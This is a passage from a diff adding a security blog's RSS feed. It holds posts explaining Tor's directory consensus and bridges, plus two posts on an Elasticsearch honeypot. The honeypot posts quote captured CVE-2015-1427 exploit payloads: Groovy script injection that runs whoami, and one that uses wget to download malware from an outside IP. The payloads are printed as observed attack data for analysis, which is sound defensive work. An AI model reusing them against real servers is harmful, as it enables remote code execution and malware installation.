+&lt;p&gt;&lt;a href=&#34;http://jordan-wright.com/blog/downloads/tweet_activity_metrics_dumpmon.csv&#34;&gt;This file&lt;/a&gt; contains the analytics of every tweet after 04/30/2014 (22k tweets). It&amp;rsquo;s in CSV format and has the following fields:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Tweet id, Tweet permalink, Tweet text, time, impressions, engagements, engagement rate, retweets, replies, favorites, user profile clicks, url clicks, hashtag clicks, detail expands, permalink clicks
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://jordan-wright.com/blog/downloads/tweet_activity_metrics_dumpmon.csv&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion:81853524e3965a2dee92693b3bcde29d&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;I hope this post gave a long-overdue update of where dumpmon is today. I recently moved dumpmon to a new home on a Digital Ocean VPS that&amp;rsquo;s bigger, faster, and has more storage than my Pi.&lt;/p&gt;
+
+&lt;p&gt;It should be noted that dumpmon is just getting started. While there haven&amp;rsquo;t been too many changes to the codebase in a while, I&amp;rsquo;ve seen people expanding the codebase in ways I&amp;rsquo;m excited to bring mainline.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;All in all, @dumpmon is here to stay.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;As always, please don&amp;rsquo;t hesitate to let me know if you have any questions or comments!&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>How Tor Works Part Three - The Consensus</title>
+      <link>http://jordan-wright.com/blog/2015/05/14/how-tor-works-part-three-the-consensus/</link>
+      <pubDate>Thu, 14 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/05/14/how-tor-works-part-three-the-consensus/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:92f80a714c92adf518d9200d85295a2a&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Welcome to the third post in my series on how Tor works! In the &lt;a href=&#34;http://jordan-wright.com/blog/blog/categories/tor/&#34;&gt;past two posts&lt;/a&gt;, we talked about how clients tunnel traffic through relays, as well as introduced the idea of unpublished relays called bridges.&lt;/p&gt;
+
+&lt;p&gt;But how do clients know what relays are active? How is the Tor network actually organized and maintained? This post will answer this question by talking about a living document called the &lt;strong&gt;consensus&lt;/strong&gt; as well as introducing a few very important Tor nodes that run the show behind the scenes.&lt;/p&gt;
+
+&lt;h3 id=&#34;respect-my-authoritah:92f80a714c92adf518d9200d85295a2a&#34;&gt;Respect My Authoritah&lt;/h3&gt;
+
+&lt;p&gt;In the last post, we mentioned that there is a master list of Tor relays as well as a master list of Tor bridges. Before talking about &lt;em&gt;how&lt;/em&gt; this list is maintained, we need to talk about &lt;em&gt;who&lt;/em&gt; maintains it.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://gitweb.torproject.org/tor.git/tree/src/or/config.c#n824&#34;&gt;Hardcoded into each Tor client&lt;/a&gt; is the information about 10 beefy Tor nodes run by trusted volunteers. These nodes have a very special role - to maintain the status of the entire Tor network. These nodes are known as &lt;strong&gt;directory authorities&lt;/strong&gt; (DA&amp;rsquo;s).&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ve &lt;a href=&#34;http://jordan-wright.com/blog/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/&#34;&gt;written a bit&lt;/a&gt; about DA&amp;rsquo;s in the past. Distributed around the world, DA&amp;rsquo;s are in charge of distributing an ever-updated master list of all known Tor relays. They are the gatekeepers that choose what relays are valid, and when.&lt;/p&gt;
+
+&lt;p&gt;So why 10? We know it&amp;rsquo;s usually a bad idea to have an even number of things voting on something, since there could be ties. You&amp;rsquo;ll recall that in the previous post I mentioned that there is a master list of relays &lt;em&gt;and&lt;/em&gt; a master list of bridges. This is where the split happens. 9 of the DA&amp;rsquo;s maintain the master list of relays, while one DA (Tonga) maintains the list of bridges.&lt;/p&gt;
+
+&lt;p&gt;Here are the DA&amp;rsquo;s:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/how_tor_works/authorities.png&#34;/&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;reaching-a-consensus:92f80a714c92adf518d9200d85295a2a&#34;&gt;Reaching a Consensus&lt;/h3&gt;
+
+&lt;p&gt;So there are DA&amp;rsquo;s and they maintain the status of the Tor network. But, &lt;strong&gt;how&lt;/strong&gt;?&lt;/p&gt;
+
+&lt;p&gt;The status of all the Tor relays is maintained in a living document called the &lt;strong&gt;consensus&lt;/strong&gt;. DA&amp;rsquo;s maintain this document and update it every hour by a vote. Here&amp;rsquo;s a basic flow of how this updating process works.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Each DA compiles a list of all known relays&lt;/li&gt;
+&lt;li&gt;Each DA then computes the other needed data, such as relay flags, bandwidth weights, and more&lt;/li&gt;
+&lt;li&gt;The DA then submits this data as a &amp;ldquo;status-vote&amp;rdquo; to all the other authorities&lt;/li&gt;
+&lt;li&gt;Each DA next will go get any other votes it is missing from the other authorities&lt;/li&gt;
+&lt;li&gt;All the parameters, relay information, etc. from each vote are combined or computed and then &lt;strong&gt;signed&lt;/strong&gt; by each DA&lt;/li&gt;
+&lt;li&gt;This signature is then posted to the other DA&amp;rsquo;s&lt;/li&gt;
+&lt;li&gt;There should be a majority of the DA&amp;rsquo;s that agree on the data, validating the new consensus&lt;/li&gt;
+&lt;li&gt;The consensus is then published by each DA&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You&amp;rsquo;ll notice that I mention each DA publishes this consensus. This is done over HTTP such that anyone can download the latest copy at &lt;code&gt;http://directory_authority/tor/status-vote/current/consensus/&lt;/code&gt;. You can see for yourself by downloading the most current consensus from &lt;code&gt;tor26&lt;/code&gt; &lt;a href=&#34;http://86.59.21.38/tor/status-vote/current/consensus/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;So we see a consensus&amp;hellip; but what does it mean?&lt;/p&gt;
+
+&lt;h3 id=&#34;anatomy-of-a-consensus:92f80a714c92adf518d9200d85295a2a&#34;&gt;Anatomy of a Consensus&lt;/h3&gt;
+
+&lt;p&gt;The consensus document is a bit tough to get a handle on right away just by reading &lt;a href=&#34;https://gitweb.torproject.org/torspec.git/tree/dir-spec.txt&#34;&gt;the spec&lt;/a&gt;. I find it helps to have things broken down visually to get an idea of how things are structured.&lt;/p&gt;
+
+&lt;p&gt;To help with this, I made a poster in the fantastic &lt;a href=&#34;https://github.com/corkami/&#34;&gt;corkami&lt;/a&gt; style. Here&amp;rsquo;s a dissection of a snipped down version of the Tor consensus document (click for full resolution!):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://jordan-wright.com/blog/blog/images/blog/how_tor_works/consensus.png&#34;&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/how_tor_works/consensus_small.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;next-steps:92f80a714c92adf518d9200d85295a2a&#34;&gt;Next Steps&lt;/h3&gt;
+
+&lt;p&gt;The consensus is a powerful document. By having trusted authorities keeping a master list of relays and their capabilities, it is easy for new and existing clients to keep track of the addition and removal of Tor relays.&lt;/p&gt;
+
+&lt;p&gt;Now, you&amp;rsquo;ll notice that we haven&amp;rsquo;t really covered exit relays. These relays hold a very important position in the Tor network, and deserve their own discussion. So, in the next post we&amp;rsquo;ll talk about how exit relays work, and what happens when exit relay operators decide to &amp;ldquo;break bad&amp;rdquo;, or wreak havoc on Tor users.&lt;/p&gt;
+
+&lt;p&gt;Until then, let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>How Tor Works: Part Two - Relays vs. Bridges</title>
+      <link>http://jordan-wright.com/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/</link>
+      <pubDate>Sat, 09 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:8e4713039018ec25aef66173ac2e0c46&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Welcome back to my series on how Tor works! In the &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/02/28/how-tor-works-part-one/&#34;&gt;last post&lt;/a&gt;, we took a look at how Tor operates from a very high level. In this post, we&amp;rsquo;ll dive a bit deeper, taking a look at a potential issue with relays in order to introduce a new concept: &lt;strong&gt;bridges&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;relay-recap:8e4713039018ec25aef66173ac2e0c46&#34;&gt;Relay Recap&lt;/h3&gt;
+
+&lt;p&gt;In the last post, we introduced relays as systems designed to move traffic in the Tor network. You&amp;rsquo;ll recall that there were three types of relays:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Entry/Guard Relays&lt;/strong&gt; - Entry points into the Tor network&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Middle Relays&lt;/strong&gt; - Send traffic from an entry relay to an exit relay&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exit Relays&lt;/strong&gt; - Send the traffic out of the Tor network to the original destination&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Relays are created by volunteers by simply configuring the Tor software to act as a relay. As a reminder, if you have bandwidth to spare, consider setting up a Tor relay!&lt;/p&gt;
+
+&lt;h3 id=&#34;the-problem-with-relays:8e4713039018ec25aef66173ac2e0c46&#34;&gt;The Problem With Relays&lt;/h3&gt;
+
+&lt;p&gt;When a Tor client starts up, it needs a way to fetch a list of all the entry, middle, and exit relays available. This list of all relays isn&amp;rsquo;t a secret. In fact, in the next post I&amp;rsquo;ll explain in detail how this list is distributed (for a sneak peek check out documents on the &lt;em&gt;concensus&lt;/em&gt;). While making this list public is necessary, it also presents a problem.&lt;/p&gt;
+
+&lt;p&gt;To figure out why this is problem, let&amp;rsquo;s play the role of the attacker and ask ourselves: &lt;em&gt;What Would an Oppressive Government Do (WWOGD)?&lt;/em&gt;. By thinking to ourselves what a &lt;strong&gt;&lt;em&gt;real OG&lt;/em&gt;&lt;/strong&gt; would do, we can figure out why Tor is built the way it is.&lt;/p&gt;
+
+&lt;p&gt;So what would a real OG do? Since censorship is a pretty big deal, and Tor is pretty darn good at getting around it, a real OG would want to block users from using Tor. There are two ways to &amp;ldquo;block Tor users&amp;rdquo;:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Block users coming out of Tor&lt;/li&gt;
+&lt;li&gt;Block users going into Tor&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The first situation is possible, and is up to the discretion of the device (router, etc.) or website owner. All a site owner needs to do is to download the list of Tor exit nodes and block all traffic from those nodes. While this would be unfortunate, there&amp;rsquo;s nothing Tor can really do about it.&lt;/p&gt;
+
+&lt;p&gt;However, the second situation is much worse. While blocking incoming Tor users can keep them from a particular site, blocking users from going into Tor will keep them from &lt;strong&gt;every&lt;/strong&gt; site, making Tor effectively useless to those under censorship - some of the users who need Tor most. Just using relays, this is possible since real OG&amp;rsquo;s can just download a list of all guard relays and block any traffic to them.&lt;/p&gt;
+
+&lt;p&gt;Thankfully, the Tor project thought of exactly this situation and came up with a clever solution around it. Say hello to &lt;strong&gt;bridges&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;introducing-bridges:8e4713039018ec25aef66173ac2e0c46&#34;&gt;Introducing Bridges&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.torproject.org/docs/bridges.html.en&#34;&gt;Bridges&lt;/a&gt; are a clever solution to this problem. At their core, bridges are just unpublished entry relays. Users that are behind censored networks can use bridges as a way to access the Tor network.&lt;/p&gt;
+
+&lt;p&gt;So if bridges are unpublished, how do users know where they are? Won&amp;rsquo;t a master list need to be published somewhere? We&amp;rsquo;ll talk more about these master lists of relays and bridges in the next post, but for now the answer is yes - there is a list of bridges maintained by the Tor project.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;This list just isn&amp;rsquo;t made public.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Instead, the Tor project has created a way for users to receive a small list of bridges so that they can connect to the rest of the Tor network. This project, called &lt;a href=&#34;https://bridges.torproject.org/bridges&#34;&gt;BridgeDB&lt;/a&gt; gives users the information about a few bridges at a time. This makes sense, since a few bridges should be all any user needs.&lt;/p&gt;
+
+&lt;p&gt;By only giving users a few bridges at a time, it is possible to prevent OG&amp;rsquo;s from blocking all possible entry points into the Tor network. Sure, as relays are discovered they can be blocked, but can anyone really discover all the bridges?&lt;/p&gt;
+
+&lt;h3 id=&#34;can-anyone-find-every-bridge:8e4713039018ec25aef66173ac2e0c46&#34;&gt;Can Anyone Find Every Bridge?&lt;/h3&gt;
+
+&lt;p&gt;The list of all bridges is a closely guarded secret. If a real OG were able to gain access to this list, it would be able to completely block users from using Tor. With this being the case, there has been &lt;a href=&#34;https://blog.torproject.org/blog/research-problems-ten-ways-discover-tor-bridges&#34;&gt;research&lt;/a&gt; done by the Tor project into possible ways people could discover all the bridges.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;d like to talk very briefly about #2 and #6 on that list, since that&amp;rsquo;s &lt;a href=&#34;https://zmap.io/paper.pdf&#34;&gt;&lt;em&gt;exactly&lt;/em&gt;&lt;/a&gt; &lt;a href=&#34;http://www.cs.uml.edu/~xinwenfu/paper/Bridge.pdf&#34;&gt;what&lt;/a&gt; researchers have done with some significant success. In the first scenario, researchers scanned the entire IPv4 space using a fast port scanner called ZMap looking for Tor bridges and &amp;ldquo;were able to identify 79–86%&amp;rdquo;&lt;sup&gt;1&lt;/sup&gt; of them. I recommend reading the paper for the really cool technical details (about finding Tor bridges and ZMap in general).&lt;/p&gt;
+
+&lt;p&gt;The second scenario is a neat one and introduces an important challenge for Tor (or any network for that matter). It all comes down to a simple concept - &lt;em&gt;users can&amp;rsquo;t be trusted&lt;/em&gt;. In order to keep the Tor network as anonymous and locked down as possible, the Tor network is designed in such a way to intentionally distrust relay operators. We&amp;rsquo;ll see more examples of this later.&lt;/p&gt;
+
+&lt;h3 id=&#34;next-steps:8e4713039018ec25aef66173ac2e0c46&#34;&gt;Next Steps&lt;/h3&gt;
+
+&lt;p&gt;In this post, we&amp;rsquo;ve talked about the need for relays that aren&amp;rsquo;t published in some &amp;ldquo;master list&amp;rdquo;. But, you&amp;rsquo;ll notice I didn&amp;rsquo;t give many details about &lt;em&gt;how&lt;/em&gt; this master list is created, or how Tor clients get access to the list.&lt;/p&gt;
+
+&lt;p&gt;So, in our next post, we&amp;rsquo;ll take a look at how the Tor network maintains the status of all relays in the network. We&amp;rsquo;ll also introduce some very powerful relays in the Tor network who run the show - &lt;strong&gt;directory authorities&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;As always, please let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Update: &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/05/14/how-tor-works-part-three-the-consensus/&#34;&gt;Part three - &amp;ldquo;The Consensus&amp;rdquo;&lt;/a&gt; has been published!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;sup&gt;[1] &lt;a href=&#34;https://zmap.io/paper.pdf&#34;&gt;https://zmap.io/paper.pdf&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>60 Days of Watching Hackers Attack Elasticsearch</title>
+      <link>http://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</link>
+      <pubDate>Thu, 30 Apr 2015 20:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:c2f7a687b0f5cbc5c5a21adfebefeddd&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;RCE vulnerability in Elasticsearch&lt;/a&gt; to automatically download and run malware.&lt;/p&gt;
+
+&lt;p&gt;After re-building the box from scratch (with many improvements!), I &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/&#34;&gt;created a honeypot&lt;/a&gt; called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&amp;rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Here are the results.&lt;/p&gt;
+
+&lt;h3 id=&#34;who-s-attacking-me:c2f7a687b0f5cbc5c5a21adfebefeddd&#34;&gt;Who&amp;rsquo;s Attacking Me?&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/jordan-wright/elastichoney&#34;&gt;Elastichoney&lt;/a&gt; keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony - free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.&lt;/p&gt;
+
+&lt;p&gt;So far, I&amp;rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/map.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;The second thing that I noticed was how fast the majority of exploit attempts died down. Here&amp;rsquo;s a histogram of attack attempts since the sensors have been running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/histogram.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;You&amp;rsquo;ll notice a spike between March 20&lt;sup&gt;th&lt;/sup&gt; and April 11&lt;sup&gt;th&lt;/sup&gt;. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. &lt;a href=&#34;http://cdn.meme.am/instances/500x/58834359.jpg&#34;&gt;You can&amp;rsquo;t explain that.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;what-are-the-attackers-doing:c2f7a687b0f5cbc5c5a21adfebefeddd&#34;&gt;What are the Attackers Doing?&lt;/h3&gt;
+
+&lt;p&gt;I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like &lt;code&gt;whoami&lt;/code&gt;, etc. However, in quite a few cases, the malware attempted to use &lt;code&gt;wget&lt;/code&gt; to download and run malware - similar to what happened to my DO instance.&lt;/p&gt;
+
+&lt;p&gt;These looked something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;source={&amp;quot;query&amp;quot;:+{&amp;quot;filtered&amp;quot;:+{&amp;quot;query&amp;quot;:+{&amp;quot;match_all&amp;quot;:+{}}}},+&amp;quot;script_fields&amp;quot;:+{&amp;quot;exp&amp;quot;:+{&amp;quot;script&amp;quot;:+&amp;quot;import+java.util.*;import+java.io.*;String+str+=+\&amp;quot;\&amp;quot;;BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\&amp;quot;wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\&amp;quot;).getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\&amp;quot;\r\n\&amp;quot;);}sb.toString();&amp;quot;}},+&amp;quot;size&amp;quot;:+1}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&amp;rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&amp;hellip;&lt;/p&gt;
+
+&lt;h3 id=&#34;the-raw-data:c2f7a687b0f5cbc5c5a21adfebefeddd&#34;&gt;The Raw Data&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&amp;rsquo;ve decided to release all the logs I currently have.&lt;/p&gt;
+
+&lt;p&gt;You can download the raw JSON logs &lt;a href=&#34;http://jordan-wright.com/blog/downloads/elastichoney_logs.json.gz&#34;&gt;here&lt;/a&gt;. Here&amp;rsquo;s an example log to show how the logs are structured:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+    &amp;quot;source&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
+    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-05-10T15:44:56.803Z&amp;quot;,
+    &amp;quot;url&amp;quot;: &amp;quot;x.x.x.x:9200/_search?&amp;quot;,
+    &amp;quot;method&amp;quot;: &amp;quot;GET&amp;quot;,
+    &amp;quot;form&amp;quot;: &amp;quot;form_payload&amp;quot;,
+    &amp;quot;payload&amp;quot;: &amp;quot;json_payload&amp;quot;,
+    &amp;quot;headers&amp;quot;: {
+        &amp;quot;user_agent&amp;quot;: &amp;quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&amp;quot;,
+        &amp;quot;host&amp;quot;: &amp;quot;x.x.x.x:9200&amp;quot;,
+        &amp;quot;content_type&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
+    },
+    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
+    &amp;quot;honeypot&amp;quot;: &amp;quot;x.x.x.x&amp;quot;,
+    &amp;quot;@version&amp;quot;: &amp;quot;1&amp;quot;,
+    &amp;quot;host&amp;quot;: &amp;quot;127.0.0.1:39642&amp;quot;,
+    &amp;quot;name&amp;quot;: &amp;quot;Python Requests&amp;quot;,
+    &amp;quot;os&amp;quot;: &amp;quot;Windows&amp;quot;,
+    &amp;quot;os_name&amp;quot;: &amp;quot;Windows&amp;quot;,
+    &amp;quot;device&amp;quot;: &amp;quot;Other&amp;quot;,
+    &amp;quot;major&amp;quot;: &amp;quot;2&amp;quot;,
+    &amp;quot;minor&amp;quot;: &amp;quot;4&amp;quot;,
+    &amp;quot;geoip&amp;quot;: {
+        &amp;quot;ip&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
+        &amp;quot;country_code2&amp;quot;: &amp;quot;CN&amp;quot;,
+        &amp;quot;country_code3&amp;quot;: &amp;quot;CHN&amp;quot;,
+        &amp;quot;country_name&amp;quot;: &amp;quot;China&amp;quot;,
+        &amp;quot;continent_code&amp;quot;: &amp;quot;AS&amp;quot;,
+        &amp;quot;region_name&amp;quot;: &amp;quot;04&amp;quot;,
+        &amp;quot;city_name&amp;quot;: &amp;quot;Nanjing&amp;quot;,
+        &amp;quot;latitude&amp;quot;: 32.0617,
+        &amp;quot;longitude&amp;quot;: 118.77780000000001,
+        &amp;quot;timezone&amp;quot;: &amp;quot;Asia/Shanghai&amp;quot;,
+        &amp;quot;real_region_name&amp;quot;: &amp;quot;Jiangsu&amp;quot;,
+        &amp;quot;location&amp;quot;: [118.77780000000001, 32.0617]
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;Enjoy!&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Introducing elastichoney - an Elasticsearch Honeypot</title>
+      <link>http://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/</link>
+      <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/elastichoney.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:c0ae86186de728bbad406ae19d00e422&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;I recently &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;wrote&lt;/a&gt; about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;elastichoney&lt;/a&gt;!&lt;/p&gt;
+
+&lt;h3 id=&#34;how-it-works:c0ae86186de728bbad406ae19d00e422&#34;&gt;How it Works&lt;/h3&gt;
+
+&lt;p&gt;This honeypot is pretty simple. It takes requests on the &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;/_search&lt;/code&gt;, and &lt;code&gt;/_nodes&lt;/code&gt; endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical - I took the responses straight from one of my hosts that got 0wned).&lt;/p&gt;
+
+&lt;p&gt;Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to &lt;code&gt;stdout&lt;/code&gt;, as well as to a file called &lt;code&gt;elastichoney.log&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s important to note that this is by no means foolproof. Clever people can take a look at &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;the code&lt;/a&gt; and quickly find ways to detect the honeypot. It&amp;rsquo;s not perfect, but it works. Let&amp;rsquo;s take a look at some results.&lt;/p&gt;
+
+&lt;h3 id=&#34;results:c0ae86186de728bbad406ae19d00e422&#34;&gt;Results&lt;/h3&gt;
+
+&lt;p&gt;Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&amp;rsquo;ve seen approx. 2000 attacks from over 60 unique IP&amp;rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+    &amp;quot;source&amp;quot;: &amp;quot;[redacted]&amp;quot;,
+    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-03-23T13:34:22.519890008-05:00&amp;quot;,
+    &amp;quot;url&amp;quot;: &amp;quot;[redacted]:9200/_search?pretty&amp;quot;,
+    &amp;quot;method&amp;quot;: &amp;quot;POST&amp;quot;,
+    &amp;quot;form&amp;quot;: &amp;quot;pretty=&amp;amp;{\&amp;quot;script_fields\&amp;quot;:+{\&amp;quot;iswin\&amp;quot;:+{\&amp;quot;lang\&amp;quot;:+\&amp;quot;groovy\&amp;quot;,+\&amp;quot;script\&amp;quot;:+\&amp;quot;java.lang.Math.class.forName(\\\&amp;quot;java.io.BufferedReader\\\&amp;quot;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&amp;quot;java.io.InputStreamReader\\\&amp;quot;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&amp;quot;java.lang.Runtime\\\&amp;quot;).getRuntime().exec(\\\&amp;quot;whoami\\\&amp;quot;).\\tgetInputStream())).readLines()\&amp;quot;}},+\&amp;quot;size\&amp;quot;:+1}=&amp;quot;,
+    &amp;quot;payload&amp;quot;: &amp;quot;&amp;quot;,
+    &amp;quot;headers&amp;quot;: {
+        &amp;quot;user_agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&amp;quot;,
+        &amp;quot;host&amp;quot;: &amp;quot;[redacted]:9200&amp;quot;,
+        &amp;quot;content_type&amp;quot;: &amp;quot;application/x-www-form-urlencoded&amp;quot;,
+        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
+    },
+    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
+    &amp;quot;honeypot&amp;quot;: &amp;quot;[redacted]&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
